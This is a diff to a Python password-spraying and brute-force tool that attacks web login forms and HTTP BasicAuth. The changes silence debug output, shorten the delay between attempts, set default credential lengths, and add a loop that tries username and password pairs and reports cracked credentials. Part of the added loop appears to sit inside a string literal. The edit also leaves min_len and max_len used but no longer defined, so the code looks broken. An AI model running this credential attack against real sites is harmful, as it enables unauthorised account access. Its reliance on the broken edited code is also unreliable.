@@ -13,8 +13,8 @@ from colorama import Fore, Style, init
 import time
 import itertools
 from datetime import datetime
-from threading import Thread
 
+from threading import Thread
 import urllib3
 
 # Define the tool's name and version
@@ -171,14 +171,14 @@ def is_password_requested_basic_auth(url, session):
     
         # Check if the response is a 401 Unauthorized indicating BasicAuth is needed
         if response.status_code == 401:
-            print(f"{Fore.GREEN}BasicAuth required on {url}")
+            # print(f"{Fore.GREEN}BasicAuth required on {url}") // Can be useful when debugging
             return True
         
         elif response.status_code == 403:
             print(f"{Fore.RED}Access forbidden. Reason: {response.reason}")
         
         else:
-            print(f"{Fore.WHITE}No BasicAuth required on {url}")
+            # print(f"{Fore.WHITE}No BasicAuth required on {url}") // Can be useful when debugging
             return False
         
     except RequestException as e:
@@ -211,7 +211,7 @@ def is_password_requested_basic_password_field(url, session):
             print(f"{Fore.GREEN}Password field found on {url}")
             return True
         else:
-            print(f"{Fore.WHITE}No password field on {url}")
+            # print(f"{Fore.WHITE}No password field on {url}") // Can be useful when debugging
             return False
 
     except RequestException as e:
@@ -332,12 +332,13 @@ def attempt_login_with_form(full_url, session, username, password):
         action_url = urljoin(full_url, action_url)
         #print(f"{Fore.WHITE}Submitting form to {action_url} with {username}:{password}")
 
+
         # Submit the form data via POST
         login_response = session.post(action_url, data=form_data, allow_redirects=False)
 
         # Check if the response indicates a redirect (302/303)
         if login_response.status_code in [302, 303]:
-            print(f"{Fore.GREEN}Redirect detected after login attempt, likely successful. Redirect URL: {login_response.headers.get('Location', '')}")
+            # print(f"{Fore.GREEN}Redirect detected after login attempt, likely successful. Redirect URL: {login_response.headers.get('Location', '')}") // Can be useful when debugging
             return (username, password)
         
         # Check for specific keywords indicating successful login in the response content
@@ -348,6 +349,7 @@ def attempt_login_with_form(full_url, session, username, password):
         # Print the reason why the login might have failed (snippet of the error)
         failure_reason = extract_failure_reason(login_response.text)
         # print(f"{Fore.RED}Login failed for {username} on {full_url}. Reason: {failure_reason}")
+
         return None
 
     except (RequestException, Timeout, ConnectionError) as e:
@@ -394,7 +396,7 @@ def generate_password_variants(password):
     
     return variants
 
-def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check, delay=2):
+def perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check, delay=1):
     """
     Performs brute force attempts on login forms or BasicAuth with a time delay between each attempt.
 
@@ -408,18 +410,10 @@ def perform_bruteforce(username_file, password_file, ip_address, criteria, sessi
         delay (int): Time delay (in seconds) between each brute force attempt.
     """
     print(f"{Fore.YELLOW}Starting brute force attack...{Style.RESET_ALL}")
-    
-    # Set default values for min_len and max_len if they are None
-    min_len = criteria.get('min_len', 1)  # Set default minimum length to 1
-    max_len = criteria.get('max_len', 8)  # Set default maximum length to 8
 
-    # Characters to use for brute-force passwords
-    bruteforce_chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()"
-    
-    # Load the list of usernames
+    # Load and filter usernames
     with open(username_file, 'r') as user_file:
         usernames = [line.strip() for line in user_file.readlines()]
-    
     # Bruteforce each password length and combination
     for length in range(min_len, max_len + 1):
         try:
@@ -456,6 +450,7 @@ def perform_bruteforce(username_file, password_file, ip_address, criteria, sessi
             time.sleep(1)
         except requests.exceptions.RequestException as e:
             print(f"An error occurred: {e}")
+
                         
 # Helper function to check if the response contains a login form
 def is_login_form_present(html_content):
@@ -609,19 +604,19 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     pages_to_check = list(set(pages_to_check))  # Remove duplicates
 
     
-    start_timer()
+    #start_timer()
     log_resource_usage("Initial Connection","")
     t = []
     total_pages_field = 0 # stores the total number of pages that have any authentication fields
-    for page in pages_to_check:
-        #time.sleep(2)
-        
+    for page in pages_to_check:        
         full_url = urljoin(base_url, page)
         credentials_found = False  # Flag to stop further attempts once successful
+
         print("This is the full URL", full_url)
         log_resource_usage("Login at page", full_url)
         
         single_spray(full_url, passwords, usernames, session, successful_cracks, failed_cracks, total_attempts, successful_attempts, total_pages_field)
+
 
     duration = end_timer()  
 
@@ -630,11 +625,78 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     if ask_for_bruteforce():
         perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
     """
+        # Check if the page has a password field (form-based authentication)
+        if is_password_requested_basic_password_field(full_url, session):
+            total_pages_field +=1
+            for password in passwords:
+                for username in usernames:
+                    try:
+                        # print(f"{Fore.WHITE}Trying username: {username} and password: {password}") // Can be useful when debugging
+                        credentials = attempt_login_with_form(full_url, session, username, password)
+                        total_attempts = total_attempts+1
 
+                        if credentials:
+                            print(f"{Fore.GREEN}Success! Username: {credentials[0]}, Password: {credentials[1]} on {full_url}")
+                            successful_attempts = successful_attempts +1
+                            successful_cracks.append((full_url, credentials[0], credentials[1]))
+                            break
+                        else:
+                            failed_cracks.append((full_url, username, password))
+                    except (Timeout, ConnectionError):
+                        print(f"{Fore.RED}Connection failed for {full_url}")
+                        time.sleep(1)
+                    except RequestException as e:
+                        print(f"{Fore.RED}An error occurred: {e}")
+                        time.sleep(1)
+                    #time.sleep(1)
+
+        if is_password_requested_basic_auth(full_url, session):
+            start_timer()
+            total_pages_field +=1
+            for password in passwords:
+                for username in usernames:
+                    try:
+                        # print(f"{Fore.WHITE}Trying BasicAuth with username: {username} and password: {password}") // Can be useful when debugging
+                        response = session.get(full_url, auth=HTTPBasicAuth(username, password))
+                        total_attempts = total_attempts+1
+                        if response.status_code == 200:
+                            print(f"{Fore.GREEN}Success! BasicAuth credentials: Username: {username}, Password: {password} on {full_url}")
+                            successful_cracks.append((full_url, username, password))
+                            successful_attempts = successful_attempts +1
+                            break
+                        else:
+                            '''
+                            # Print a more detailed error reason based on the response code
+                            if response.status_code == 401:
+                                print(f"{Fore.RED}Failed! Unauthorized (401) with Username: {username}, Password: {password} on {full_url}")
+                            elif response.status_code == 403:
+                                print(f"{Fore.RED}Failed! Forbidden (403) with Username: {username}, Password: {password} on {full_url}")
+                            else:
+                                print(f"{Fore.RED}Failed! BasicAuth with Username: {username}, Password: {password} on {full_url} Reason: {response.reason}") #// Can be useful when debugging
+                            '''
+                            failed_cracks.append((full_url, username, password))
+
+                    except (Timeout, ConnectionError):
+                        print(f"{Fore.RED}Connection failed for {full_url}")
+                        time.sleep(1)
+                    except RequestException as e:
+                        print(f"{Fore.RED}An error occurred: {e}")
+                        time.sleep(1)
+            duration = end_timer()
+    # duration = end_timer()
+            
+    # After exhausting all combinations, ask if the user wants to proceed with bruteforce
+    #if ask_for_bruteforce():
+        #perform_bruteforce(username_file, password_file, ip_address, criteria, session, pages_to_check)
+
+    '''
     if failed_cracks:
         print(f"{Fore.RED}Failed pages that required a password:")
         for page, user, pwd in failed_cracks:
             print(f"{Fore.WHITE}Page: {page}, Username: {user}, Password: {pwd}")
+    '''
+    if failed_cracks: ### if uncommenting the code above when debugging, make sure to comment this if statement (not the else)
+        pass
     else:
         print(f"{Fore.GREEN}No failed password cracking attempts.")
     
@@ -662,7 +724,6 @@ def password_spraying(ip_address, username_file, password_file, criteria):
     print(f"{Fore.YELLOW}\n--- Resource Utilization ---{Style.RESET_ALL}")
     for i, (phase, memory) in enumerate(memory_usage_per_phase):
         memory = memory_usage_per_phase[i][1]  # Access the corresponding memory usage
-
         print(f"{Fore.CYAN}{phase} - Memory: {memory}%")
 
 
@@ -691,15 +752,15 @@ def main():
     
     # Parse user-specified criteria
     criteria = {
-        'username_min_len': int(sys.argv[sys.argv.index('--username-min-len') + 1]) if '--username-min-len' in sys.argv else None,
-        'username_max_len': int(sys.argv[sys.argv.index('--username-max-len') + 1]) if '--username-max-len' in sys.argv else None,
+        'username_min_len': int(sys.argv[sys.argv.index('--username-min-len') + 1]) if '--username-min-len' in sys.argv else 1, # making sure that the minumum length is 1 if user doesn't enter
+        'username_max_len': int(sys.argv[sys.argv.index('--username-max-len') + 1]) if '--username-max-len' in sys.argv else 20, # making sure that the maximum length is 20 if user doesn't enter
         'username_uppercase': '--username-uppercase' in sys.argv,
         'username_lowercase': '--username-lowercase' in sys.argv,
         'username_numbers': '--username-numbers' in sys.argv,
         'username_special_chars': '--username-special-chars' in sys.argv,
         
-        'password_min_len': int(sys.argv[sys.argv.index('--password-min-len') + 1]) if '--password-min-len' in sys.argv else None,
-        'password_max_len': int(sys.argv[sys.argv.index('--password-max-len') + 1]) if '--password-max-len' in sys.argv else None,
+        'password_min_len': int(sys.argv[sys.argv.index('--password-min-len') + 1]) if '--password-min-len' in sys.argv else 1,
+        'password_max_len': int(sys.argv[sys.argv.index('--password-max-len') + 1]) if '--password-max-len' in sys.argv else 20,
         'password_uppercase': '--password-uppercase' in sys.argv,
         'password_lowercase': '--password-lowercase' in sys.argv,
         'password_numbers': '--password-numbers' in sys.argv,
